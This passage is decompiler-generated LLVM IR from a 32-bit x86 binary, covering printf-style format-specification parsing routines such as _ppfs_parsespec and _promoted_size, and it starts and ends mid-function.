  store i32 %v1_805c3c4, i32* %ebx.global-to-local, align 4
  %v0_805c3c7.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805c3c8.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c3c7

dec_label_pc_805c3c7:                             ; preds = %dec_label_pc_805c357, %dec_label_pc_805c3c4
  %v1_805c3c8 = phi i32 [ %v1_805c3c824, %dec_label_pc_805c357 ], [ %v1_805c3c8.pre, %dec_label_pc_805c3c4 ]
  %v0_805c3c7 = phi i32 [ %v1_805c35723, %dec_label_pc_805c357 ], [ %v0_805c3c7.pre, %dec_label_pc_805c3c4 ]
  %v1_805c3c7 = add i32 %v0_805c3c7, 1
  store i32 %v1_805c3c7, i32* %esi.global-to-local, align 4
  %v2_805c3c8 = add i32 %v1_805c3c8, 28
  %v3_805c3c8 = inttoptr i32 %v2_805c3c8 to i32*
  %v4_805c3c8 = load i32, i32* %v3_805c3c8, align 4
  %v5_805c3cb = icmp slt i32 %v1_805c3c7, %v4_805c3c8
  br i1 %v5_805c3cb, label %dec_label_pc_805c357, label %dec_label_pc_805c3c8.dec_label_pc_805c3fd.loopexit_crit_edge

dec_label_pc_805c3cf:                             ; preds = %entry
  br i1 %v1_805c3d6, label %dec_label_pc_805c3e6, label %dec_label_pc_805c3d8

dec_label_pc_805c3d8:                             ; preds = %dec_label_pc_805c3cf
  %v1_805c3d8 = add i32 %arg1, 36
  %v2_805c3d8 = inttoptr i32 %v1_805c3d8 to i8*
  %v3_805c3d8 = load i8, i8* %v2_805c3d8, align 1
  %v2_805c3dc = zext i8 %v3_805c3d8 to i32
  %v3_805c3dc = mul nuw nsw i32 %v2_805c3dc, 12
  store i32 %v3_805c3dc, i32* %eax.global-to-local, align 4
  %v2_805c3df = add i32 %arg1, 68
  %v3_805c3df = add i32 %v2_805c3df, %v3_805c3dc
  %v4_805c3df = inttoptr i32 %v3_805c3df to i32*
  %v5_805c3df = load i32, i32* %v4_805c3df, align 4
  store i32 %v5_805c3df, i32* %eax.global-to-local, align 4
  store i32 %v5_805c3df, i32* %v2_805c3cf, align 4
  %v0_805c3e6.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c3e6

dec_label_pc_805c3e6:                             ; preds = %dec_label_pc_805c3cf, %dec_label_pc_805c3d8
  %v1_805c3fa = phi i32 [ %arg1, %dec_label_pc_805c3cf ], [ %v0_805c3e6.pre, %dec_label_pc_805c3d8 ]
  %v1_805c3e6 = add i32 %v1_805c3fa, 4
  %v2_805c3e6 = inttoptr i32 %v1_805c3e6 to i32*
  %v3_805c3e6 = load i32, i32* %v2_805c3e6, align 4
  %v8_805c3e6 = icmp eq i32 %v3_805c3e6, -2147483648
  %v1_805c3ed = icmp eq i1 %v8_805c3e6, false
  br i1 %v1_805c3ed, label %dec_label_pc_805c3fd, label %dec_label_pc_805c3ef

dec_label_pc_805c3ef:                             ; preds = %dec_label_pc_805c3e6
  %v1_805c3ef = add i32 %v1_805c3fa, 37
  %v2_805c3ef = inttoptr i32 %v1_805c3ef to i8*
  %v3_805c3ef = load i8, i8* %v2_805c3ef, align 1
  %v2_805c3f3 = zext i8 %v3_805c3ef to i32
  %v3_805c3f3 = mul nuw nsw i32 %v2_805c3f3, 12
  store i32 %v3_805c3f3, i32* %eax.global-to-local, align 4
  %v1_805c3f6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805c3f6 = add nsw i32 %v3_805c3f3, -12
  %v3_805c3f6 = add i32 %v2_805c3f6, %v1_805c3f6
  %v4_805c3f6 = inttoptr i32 %v3_805c3f6 to i32*
  %v5_805c3f6 = load i32, i32* %v4_805c3f6, align 4
  store i32 %v5_805c3f6, i32* %eax.global-to-local, align 4
  store i32 %v5_805c3f6, i32* %v2_805c3e6, align 4
  %v0_805c3fd.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c3fd

dec_label_pc_805c3c8.dec_label_pc_805c3fd.loopexit_crit_edge: ; preds = %dec_label_pc_805c3c7
  br label %dec_label_pc_805c3fd.loopexit

dec_label_pc_805c3fd.loopexit:                    ; preds = %dec_label_pc_805c3c8.dec_label_pc_805c3fd.loopexit_crit_edge, %dec_label_pc_805c353
  %v1_805c3c8.lcssa = phi i32 [ %v1_805c3c8, %dec_label_pc_805c3c8.dec_label_pc_805c3fd.loopexit_crit_edge ], [ %v1_805c3c817, %dec_label_pc_805c353 ]
  br label %dec_label_pc_805c3fd

dec_label_pc_805c3fd:                             ; preds = %dec_label_pc_805c3fd.loopexit, %dec_label_pc_805c3e6, %dec_label_pc_805c3ef
  %v10_805c404 = phi i32 [ %v1_805c3c8.lcssa, %dec_label_pc_805c3fd.loopexit ], [ %v1_805c3fa, %dec_label_pc_805c3e6 ], [ %v0_805c3fd.pre, %dec_label_pc_805c3ef ]
  %v1_805c3fd = add i32 %v10_805c404, 8
  %v2_805c3fd = inttoptr i32 %v1_805c3fd to i32*
  %v3_805c3fd = load i32, i32* %v2_805c3fd, align 4
  store i32 %v3_805c3fd, i32* %eax.global-to-local, align 4
  %v2_805c400 = icmp slt i32 %v3_805c3fd, 0
  %v1_805c402 = icmp eq i1 %v2_805c400, false
  br i1 %v1_805c402, label %dec_label_pc_805c418, label %dec_label_pc_805c404

dec_label_pc_805c404:                             ; preds = %dec_label_pc_805c3fd
  %v1_805c404 = add i32 %v10_805c404, 16
  %v2_805c404 = inttoptr i32 %v1_805c404 to i32*
  %v3_805c404 = load i32, i32* %v2_805c404, align 4
  %v4_805c404 = or i32 %v3_805c404, 8
  store i32 %v4_805c404, i32* %v2_805c404, align 4
  %v0_805c408 = load i32, i32* @ecx, align 4
  %v1_805c408 = add i32 %v0_805c408, 16
  %v2_805c408 = inttoptr i32 %v1_805c408 to i32*
  %v3_805c408 = load i32, i32* %v2_805c408, align 4
  %v4_805c408 = and i32 %v3_805c408, -2
  store i32 %v4_805c408, i32* %v2_805c408, align 4
  %v0_805c40c = load i32, i32* %eax.global-to-local, align 4
  %v1_805c40c = sub i32 0, %v0_805c40c
  store i32 %v1_805c40c, i32* %eax.global-to-local, align 4
  %v1_805c40e = load i32, i32* @ecx, align 4
  %v2_805c40e = add i32 %v1_805c40e, 8
  %v3_805c40e = inttoptr i32 %v2_805c40e to i32*
  store i32 %v1_805c40c, i32* %v3_805c40e, align 4
  %v0_805c411 = load i32, i32* @ecx, align 4
  %v1_805c411 = add i32 %v0_805c411, 20
  %v2_805c411 = inttoptr i32 %v1_805c411 to i32*
  store i32 32, i32* %v2_805c411, align 4
  %v0_805c41a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c418

dec_label_pc_805c418:                             ; preds = %dec_label_pc_805c3fd, %dec_label_pc_805c404
  %v0_805c41a = phi i32 [ %v3_805c3fd, %dec_label_pc_805c3fd ], [ %v0_805c41a.pre, %dec_label_pc_805c404 ]
  %v2_805c418 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c418, i32* @ebx, align 4
  ret i32 %v0_805c41a

; uselistorder directives
  uselistorder i32 %v3_805c3f3, { 1, 0 }
  uselistorder i32 %v3_805c3dc, { 1, 0 }
  uselistorder i32 %v1_805c3c7, { 2, 1, 0 }
  uselistorder i32 %v1_805c3c8, { 1, 2, 0 }
  uselistorder i32 %v3_805c360, { 1, 0, 2 }
  uselistorder i32* %v2_805c360, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_805c35b, { 1, 0 }
  uselistorder i32 %v6_805c357, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_805c35723, { 1, 0 }
  uselistorder i32 %v1_805c3c817, { 2, 0, 1 }
  uselistorder i1 %v1_805c3d6, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_805c418, { 1, 0 }
  uselistorder label %dec_label_pc_805c3fd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805c3e6, { 1, 0 }
  uselistorder label %dec_label_pc_805c3c7, { 1, 0 }
  uselistorder label %dec_label_pc_805c3c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c3c2, { 1, 0 }
  uselistorder label %dec_label_pc_805c3ba, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805c357, { 1, 0 }
  uselistorder label %dec_label_pc_805c353, { 1, 0 }
  uselistorder label %dec_label_pc_805c339, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805c41c = load i32, i32* @eax, align 4
  br label %dec_label_pc_805c423

dec_label_pc_805c423:                             ; preds = %dec_label_pc_805c423, %entry
  %v0_805c423 = phi i32 [ ptrtoint (i8** @global_var_806cb9e.702 to i32), %entry ], [ %v1_805c423, %dec_label_pc_805c423 ]
  %v1_805c423 = add i32 %v0_805c423, -2
  %v1_805c426 = inttoptr i32 %v1_805c423 to i16*
  %v2_805c426 = load i16, i16* %v1_805c426, align 2
  %v3_805c426 = sext i16 %v2_805c426 to i32
  %v12_805c429 = icmp ne i32 %v3_805c426, %v0_805c41c
  %v6_805c433 = icmp ugt i32 %v1_805c423, ptrtoint (i32* @global_var_806cb86.703 to i32)
  %or.cond = and i1 %v6_805c433, %v12_805c429
  br i1 %or.cond, label %dec_label_pc_805c423, label %dec_label_pc_805c435

dec_label_pc_805c435:                             ; preds = %dec_label_pc_805c423
  %.pre = add i32 %v0_805c423, -134663048
  %v2_805c43b = sdiv i32 %.pre, 2
  store i32 %v2_805c43b, i32* @edx, align 4
  %v1_805c43d = add i32 %v2_805c43b, ptrtoint (i8** @global_var_806cb9e.702 to i32)
  %v2_805c43d = inttoptr i32 %v1_805c43d to i8*
  %v3_805c43d = load i8, i8* %v2_805c43d, align 1
  %v4_805c43d = zext i8 %v3_805c43d to i32
  ret i32 %v4_805c43d

; uselistorder directives
  uselistorder i32 %v2_805c43b, { 1, 0 }
  uselistorder i32 %v1_805c423, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_806cb9e.702 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805c446 = load i32, i32* @edi, align 4
  %v0_805c447 = load i32, i32* @esi, align 4
  %v0_805c448 = load i32, i32* @ebx, align 4
  store i32 %v0_805c448, i32* %stack_var_-16, align 4
  %v4_805c448 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805c474 = add i32 %tmp76, 24
  %v2_805c474 = inttoptr i32 %v1_805c474 to i32*
  %v3_805c474 = load i32, i32* %v2_805c474, align 4
  store i32 %v3_805c474, i32* %eax.global-to-local, align 4
  %v1_805c47b = add i32 %tmp76, 16
  %v2_805c47b = inttoptr i32 %v1_805c47b to i32*
  %v3_805c47b = load i32, i32* %v2_805c47b, align 4
  %v1_805c47e = and i32 %v3_805c47b, 128
  %v2_805c47e = icmp eq i32 %v1_805c47e, 0
  store i32 %v1_805c47e, i32* %edi.global-to-local, align 4
  %v1_805c484 = icmp eq i1 %v2_805c47e, false
  br i1 %v1_805c484, label %dec_label_pc_805c497, label %dec_label_pc_805c486

dec_label_pc_805c486:                             ; preds = %entry
  %v2_805c486 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_805c4e4.outer

dec_label_pc_805c491:                             ; preds = %dec_label_pc_805c61f
  %v1_805c491 = add i32 %v0_805c61f.pre.pre, 1
  store i32 %v1_805c491, i32* @esi, align 4
  br label %dec_label_pc_805c62f

dec_label_pc_805c497:                             ; preds = %entry
  %v15_805c449 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805c499

dec_label_pc_805c499:                             ; preds = %dec_label_pc_805c4c1.dec_label_pc_805c499_crit_edge, %dec_label_pc_805c497
  %v2_805c4aa = phi i32 [ %v2_805c4aa.pre, %dec_label_pc_805c4c1.dec_label_pc_805c499_crit_edge ], [ %v15_805c449, %dec_label_pc_805c497 ]
  %v3_805c4aa = phi i32 [ %v1_805c4c1, %dec_label_pc_805c4c1.dec_label_pc_805c499_crit_edge ], [ 0, %dec_label_pc_805c497 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805c49d = mul i32 %v3_805c4aa, 4
  store i32 %v1_805c49d, i32* @ecx, align 4
  %v2_805c4a4 = load i32, i32* %arg1, align 4
  store i32 %v2_805c4a4, i32* @edx, align 4
  %v2_805c4a6 = add i32 %v1_805c49d, -4
  %v3_805c4a6 = add i32 %v2_805c4a6, %v2_805c4a4
  %v4_805c4a6 = inttoptr i32 %v3_805c4a6 to i32*
  %v5_805c4a6 = load i32, i32* %v4_805c4a6, align 4
  store i32 %v5_805c4a6, i32* %eax.global-to-local, align 4
  %v1_805c4aa = trunc i32 %v5_805c4a6 to i8
  %v4_805c4aa = add i32 %v2_805c4aa, 36
  %v5_805c4aa = add i32 %v4_805c4aa, %v3_805c4aa
  %v6_805c4aa = inttoptr i32 %v5_805c4aa to i8*
  store i8 %v1_805c4aa, i8* %v6_805c4aa, align 1
  %v0_805c4ae = load i32, i32* %eax.global-to-local, align 4
  %v1_805c4ae = urem i32 %v0_805c4ae, 256
  %v2_805c4ae = load i32, i32* @ebx, align 4
  %v3_805c4ae = and i32 %v2_805c4ae, -256
  %v4_805c4ae = or i32 %v3_805c4ae, %v1_805c4ae
  store i32 %v4_805c4ae, i32* @ebx, align 4
  %v1_805c4b0 = mul i32 %v0_805c4ae, 16777216
  %v2_805c4b0 = sdiv i32 %v1_805c4b0, 16777216
  store i32 %v2_805c4b0, i32* %eax.global-to-local, align 4
  %v1_805c4b3 = load i32, i32* @edx, align 4
  %v2_805c4b3 = load i32, i32* @ecx, align 4
  %v3_805c4b3 = add i32 %v1_805c4b3, -4
  %v4_805c4b3 = add i32 %v3_805c4b3, %v2_805c4b3
  %v5_805c4b3 = inttoptr i32 %v4_805c4b3 to i32*
  %v6_805c4b3 = load i32, i32* %v5_805c4b3, align 4
  %v17_805c4b3 = icmp eq i32 %v2_805c4b0, %v6_805c4b3
  %v1_805c4b7 = icmp eq i1 %v17_805c4b3, false
  br i1 %v1_805c4b7, label %dec_label_pc_805c800, label %dec_label_pc_805c4bd

dec_label_pc_805c4bd:                             ; preds = %dec_label_pc_805c499
  %v3_805c4bd = trunc i32 %v0_805c4ae to i8
  %v4_805c4bd = icmp eq i8 %v3_805c4bd, 0
  br i1 %v4_805c4bd, label %dec_label_pc_805c4c7, label %dec_label_pc_805c4c1

dec_label_pc_805c4c1:                             ; preds = %dec_label_pc_805c4bd
  %v0_805c4c1 = load i32, i32* %esi.global-to-local, align 4
  %v1_805c4c1 = add i32 %v0_805c4c1, 1
  store i32 %v1_805c4c1, i32* %esi.global-to-local, align 4
  %tmp154 = icmp ult i32 %v1_805c4c1, 32
  br i1 %tmp154, label %dec_label_pc_805c4c1.dec_label_pc_805c499_crit_edge, label %dec_label_pc_805c4c7

dec_label_pc_805c4c1.dec_label_pc_805c499_crit_edge: ; preds = %dec_label_pc_805c4c1
  %v2_805c4aa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c499

dec_label_pc_805c4c7:                             ; preds = %dec_label_pc_805c4c1, %dec_label_pc_805c4bd
  %v2_805c4cc = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_805c4e4.outer

dec_label_pc_805c4e4.outer:                       ; preds = %dec_label_pc_805c4c7, %dec_label_pc_805c486, %dec_label_pc_805c601
  %v0_805c4f0.ph94 = phi i32 [ %v1_805c601, %dec_label_pc_805c601 ], [ %v2_805c486, %dec_label_pc_805c486 ], [ %v2_805c4cc, %dec_label_pc_805c4c7 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_805c601 ], [ %tmp66, %dec_label_pc_805c486 ], [ %tmp66, %dec_label_pc_805c4c7 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_805c48a, %dec_label_pc_805c601 ], [ 0, %dec_label_pc_805c486 ], [ 0, %dec_label_pc_805c4c7 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_805c601 ], [ %v3_805c474, %dec_label_pc_805c486 ], [ %v3_805c474, %dec_label_pc_805c4c7 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_805c601 ], [ 0, %dec_label_pc_805c486 ], [ 0, %dec_label_pc_805c4c7 ]
  %v7_805c4eb = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_805c4eb = trunc i64 %v7_805c4eb to i32
  %v2_805c4f3 = add i32 %v8_805c4eb, 80
  br label %dec_label_pc_805c4e4

dec_label_pc_805c4e4:                             ; preds = %dec_label_pc_805c4e4.outer, %dec_label_pc_805c5a1
  %v0_805c4f0 = phi i32 [ %v0_805c5ae, %dec_label_pc_805c5a1 ], [ %v0_805c4f0.ph94, %dec_label_pc_805c4e4.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_805c5a1 ], [ %stack_var_-32.1.ph, %dec_label_pc_805c4e4.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_805c5a1 ], [ %stack_var_-88.1.ph, %dec_label_pc_805c4e4.outer ]
  store i32 %v0_805c4f0, i32* @edx, align 4
  store i32 %v0_805c4f0, i32* @esi, align 4
  %v1_805c4e6 = inttoptr i32 %v0_805c4f0 to i8*
  %v2_805c4e6 = load i8, i8* %v1_805c4e6, align 1
  %v11_805c4e6 = icmp eq i8 %v2_805c4e6, 42
  %v1_805c4e9 = icmp eq i1 %v11_805c4e6, false
  br i1 %v1_805c4e9, label %dec_label_pc_805c4fb, label %dec_label_pc_805c4eb

dec_label_pc_805c4eb:                             ; preds = %dec_label_pc_805c4e4
  store i32 %v8_805c4eb, i32* %eax.global-to-local, align 4
  %v1_805c4f0 = add i32 %v0_805c4f0, 1
  store i32 %v1_805c4f0, i32* @esi, align 4
  %v0_805c4f3 = load i32, i32* @esp, align 4
  %v3_805c4f3 = add i32 %v2_805c4f3, %v0_805c4f3
  %v4_805c4f3 = inttoptr i32 %v3_805c4f3 to i32*
  store i32 0, i32* %v4_805c4f3, align 4
  %v0_805c515.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c4fb

dec_label_pc_805c4fb:                             ; preds = %dec_label_pc_805c4e4, %dec_label_pc_805c4eb
  %v0_805c515.pre = phi i32 [ %v0_805c4f0, %dec_label_pc_805c4e4 ], [ %v0_805c515.pre.pre, %dec_label_pc_805c4eb ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_805c4fd = load i32, i32* inttoptr (i32 134695008 to i32*), align 32
  store i32 %v0_805c4fd, i32* %ebp.global-to-local, align 4
  %v4_805c515.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c515

dec_label_pc_805c505:                             ; preds = %dec_label_pc_805c515
  %v1_805c505 = add i32 %v1_805c50d, -4094
  %v6_805c505 = sub i32 4093, %v1_805c50d
  %v7_805c505 = and i32 %v6_805c505, %v1_805c50d
  %v8_805c505 = icmp slt i32 %v7_805c505, 0
  %v9_805c505 = icmp eq i32 %v1_805c505, 0
  %v10_805c505 = icmp slt i32 %v1_805c505, 0
  %v3_805c50b = icmp eq i1 %v10_805c505, %v8_805c505
  %v4_805c50b = icmp eq i1 %v9_805c505, false
  %v5_805c50b = and i1 %v4_805c50b, %v3_805c50b
  br i1 %v5_805c50b, label %dec_label_pc_805c514, label %dec_label_pc_805c50d

dec_label_pc_805c50d:                             ; preds = %dec_label_pc_805c505
  %v3_805c50d = mul i32 %v1_805c50d, 10
  store i32 %v3_805c50d, i32* %eax.global-to-local, align 4
  %v2_805c510 = add i32 %v3_805c50d, -48
  %v3_805c510 = add i32 %v2_805c510, %v2_805c517
  store i32 %v3_805c510, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805c514

dec_label_pc_805c514:                             ; preds = %dec_label_pc_805c505, %dec_label_pc_805c50d
  %v0_805c52f32 = phi i32 [ %v1_805c50d, %dec_label_pc_805c505 ], [ %v3_805c510, %dec_label_pc_805c50d ]
  %v4_805c51528 = phi i32 [ %v6_805c515, %dec_label_pc_805c505 ], [ %v3_805c50d, %dec_label_pc_805c50d ]
  %v1_805c514 = add i32 %v0_805c514, 1
  store i32 %v1_805c514, i32* @esi, align 4
  br label %dec_label_pc_805c515

dec_label_pc_805c515:                             ; preds = %dec_label_pc_805c4fb, %dec_label_pc_805c514
  %v1_805c50d = phi i32 [ 0, %dec_label_pc_805c4fb ], [ %v0_805c52f32, %dec_label_pc_805c514 ]
  %v4_805c515 = phi i32 [ %v4_805c515.pre, %dec_label_pc_805c4fb ], [ %v4_805c51528, %dec_label_pc_805c514 ]
  %v0_805c514 = phi i32 [ %v0_805c515.pre, %dec_label_pc_805c4fb ], [ %v1_805c514, %dec_label_pc_805c514 ]
  %v1_805c515 = inttoptr i32 %v0_805c514 to i8*
  %v2_805c515 = load i8, i8* %v1_805c515, align 1
  %v3_805c515 = zext i8 %v2_805c515 to i32
  %v5_805c515 = and i32 %v4_805c515, -256
  %v6_805c515 = or i32 %v3_805c515, %v5_805c515
  store i32 %v6_805c515, i32* %eax.global-to-local, align 4
  %v2_805c517 = sext i8 %v2_805c515 to i32
  store i32 %v2_805c517, i32* @ecx, align 4
  %v2_805c51a = mul nsw i32 %v2_805c517, 2
  %v3_805c51a = add i32 %v2_805c51a, %v0_805c4fd
  %v4_805c51a = inttoptr i32 %v3_805c51a to i8*
  %v5_805c51a = load i8, i8* %v4_805c51a, align 1
  %v6_805c51a = and i8 %v5_805c51a, 8
  %v7_805c51a = icmp eq i8 %v6_805c51a, 0
  %v1_805c51f = icmp eq i1 %v7_805c51a, false
  br i1 %v1_805c51f, label %dec_label_pc_805c505, label %dec_label_pc_805c521

dec_label_pc_805c521:                             ; preds = %dec_label_pc_805c515
  %v0_805c521 = load i32, i32* @edx, align 4
  %v1_805c521 = add i32 %v0_805c521, -1
  %v2_805c521 = inttoptr i32 %v1_805c521 to i8*
  %v3_805c521 = load i8, i8* %v2_805c521, align 1
  %v12_805c521 = icmp eq i8 %v3_805c521, 37
  %v1_805c525 = icmp eq i1 %v12_805c521, false
  br i1 %v1_805c525, label %dec_label_pc_805c5b8, label %dec_label_pc_805c52b

dec_label_pc_805c52b:                             ; preds = %dec_label_pc_805c521
  %v10_805c52b = icmp eq i8 %v2_805c515, 36
  %v1_805c52d = icmp eq i1 %v10_805c52b, false
  br i1 %v1_805c52d, label %dec_label_pc_805c55f, label %dec_label_pc_805c52f

dec_label_pc_805c52f:                             ; preds = %dec_label_pc_805c52b
  %tmp89 = icmp slt i32 %v1_805c50d, 1
  br i1 %tmp89, label %dec_label_pc_805c55f, label %dec_label_pc_805c533

dec_label_pc_805c533:                             ; preds = %dec_label_pc_805c52f
  %v1_805c533 = add i32 %v0_805c514, 1
  store i32 %v1_805c533, i32* @edx, align 4
  %v4_805c536 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_805c536, label %dec_label_pc_805c800, label %dec_label_pc_805c541

dec_label_pc_805c541:                             ; preds = %dec_label_pc_805c533
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_805c549 = sub i32 %v1_805c50d, %stack_var_-88.1
  %v8_805c549 = xor i32 %v1_805c50d, %stack_var_-88.1
  %v9_805c549 = xor i32 %v2_805c549, %v1_805c50d
  %v10_805c549 = and i32 %v9_805c549, %v8_805c549
  %v11_805c549 = icmp slt i32 %v10_805c549, 0
  %v12_805c549 = icmp eq i32 %v2_805c549, 0
  %v13_805c549 = icmp slt i32 %v2_805c549, 0
  %v3_805c54b = icmp ne i1 %v13_805c549, %v11_805c549
  %v4_805c54b = or i1 %v12_805c549, %v3_805c54b
  %stack_var_-88.1.v0_805c54d = select i1 %v4_805c54b, i32 %stack_var_-88.1, i32 %v1_805c50d
  br label %dec_label_pc_805c55b

dec_label_pc_805c55b:                             ; preds = %dec_label_pc_805c56f, %dec_label_pc_805c541, %dec_label_pc_805c573
  %v0_805c55b = phi i32 [ %v1_805c533, %dec_label_pc_805c541 ], [ %v0_805c521, %dec_label_pc_805c573 ], [ %v0_805c521, %dec_label_pc_805c56f ]
  %stack_var_-32.2 = phi i32 [ %v1_805c50d, %dec_label_pc_805c541 ], [ %stack_var_-32.1, %dec_label_pc_805c573 ], [ %stack_var_-32.1, %dec_label_pc_805c56f ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_805c54d, %dec_label_pc_805c541 ], [ 0, %dec_label_pc_805c573 ], [ 0, %dec_label_pc_805c56f ]
  store i32 %v0_805c55b, i32* @esi, align 4
  br label %dec_label_pc_805c582

dec_label_pc_805c55f:                             ; preds = %dec_label_pc_805c52f, %dec_label_pc_805c52b
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_805c56f, label %dec_label_pc_805c566

dec_label_pc_805c566:                             ; preds = %dec_label_pc_805c55f
  %v10_805c566 = icmp eq i8 %v2_805c515, 109
  br i1 %v10_805c566, label %dec_label_pc_805c5b8, label %dec_label_pc_805c800

dec_label_pc_805c56f:                             ; preds = %dec_label_pc_805c55f
  %tmp = icmp ugt i32 %v0_805c514, %v0_805c521
  br i1 %tmp, label %dec_label_pc_805c573, label %dec_label_pc_805c55b

dec_label_pc_805c573:                             ; preds = %dec_label_pc_805c56f
  %v1_805c573 = inttoptr i32 %v0_805c521 to i8*
  %v2_805c573 = load i8, i8* %v1_805c573, align 1
  %v8_805c573 = icmp eq i8 %v2_805c573, 48
  br i1 %v8_805c573, label %dec_label_pc_805c55b, label %dec_label_pc_805c5b8

dec_label_pc_805c582:                             ; preds = %dec_label_pc_805c593, %dec_label_pc_805c55b
  %v0_805c5ae = phi i32 [ %v1_805c593, %dec_label_pc_805c593 ], [ %v0_805c55b, %dec_label_pc_805c55b ]
  %v4_805c58c35 = phi i32 [ %v6_805c58c, %dec_label_pc_805c593 ], [ %v6_805c515, %dec_label_pc_805c55b ]
  store i32 ptrtoint ([8 x i8]* @global_var_806cb7e.706 to i32), i32* %edx.global-to-local, align 4
  %v1_805c58f = inttoptr i32 %v0_805c5ae to i8*
  br label %dec_label_pc_805c58c

dec_label_pc_805c58c:                             ; preds = %dec_label_pc_805c59d, %dec_label_pc_805c582
  %v4_805c58c = phi i32 [ %v4_805c58c35, %dec_label_pc_805c582 ], [ %v6_805c58c, %dec_label_pc_805c59d ]
  %v0_805c58e = phi i32 [ ptrtoint ([8 x i8]* @global_var_806cb7e.706 to i32), %dec_label_pc_805c582 ], [ %v1_805c58e, %dec_label_pc_805c59d ]
  %v0_805c59d = phi i32 [ 1, %dec_label_pc_805c582 ], [ %v2_805c59d, %dec_label_pc_805c59d ]
  store i32 %v0_805c59d, i32* @ecx, align 4
  %v1_805c58c = inttoptr i32 %v0_805c58e to i8*
  %v2_805c58c = load i8, i8* %v1_805c58c, align 1
  %v3_805c58c = zext i8 %v2_805c58c to i32
  %v5_805c58c = and i32 %v4_805c58c, -256
  %v6_805c58c = or i32 %v3_805c58c, %v5_805c58c
  store i32 %v6_805c58c, i32* %eax.global-to-local, align 4
  %v1_805c58e = add i32 %v0_805c58e, 1
  store i32 %v1_805c58e, i32* @edx, align 4
  %v2_805c58f = load i8, i8* %v1_805c58f, align 1
  %v15_805c58f = icmp eq i8 %v2_805c58f, %v2_805c58c
  %v1_805c591 = icmp eq i1 %v15_805c58f, false
  br i1 %v1_805c591, label %dec_label_pc_805c598, label %dec_label_pc_805c593

dec_label_pc_805c593:                             ; preds = %dec_label_pc_805c58c
  %v1_805c593 = add i32 %v0_805c5ae, 1
  store i32 %v1_805c593, i32* @esi, align 4
  %v0_805c594 = load i32, i32* %edi.global-to-local, align 4
  %v2_805c594 = or i32 %v0_805c594, %v0_805c59d
  store i32 %v2_805c594, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805c582

dec_label_pc_805c598:                             ; preds = %dec_label_pc_805c58c
  %v1_805c598 = inttoptr i32 %v1_805c58e to i8*
  %v2_805c598 = load i8, i8* %v1_805c598, align 1
  %v3_805c598 = icmp eq i8 %v2_805c598, 0
  br i1 %v3_805c598, label %dec_label_pc_805c5a1, label %dec_label_pc_805c59d

dec_label_pc_805c59d:                             ; preds = %dec_label_pc_805c598
  %v2_805c59d = mul i32 %v0_805c59d, 2
  br label %dec_label_pc_805c58c

dec_label_pc_805c5a1:                             ; preds = %dec_label_pc_805c598
  %v0_805c5a1 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805c5a5 = udiv i32 %v0_805c5a1, 2
  %v1_805c5a5.not = or i32 %v1_805c5a5, -6
  %v1_805c5aa = xor i32 %v1_805c5a5.not, 5
  store i32 %v1_805c5aa, i32* %eax.global-to-local, align 4
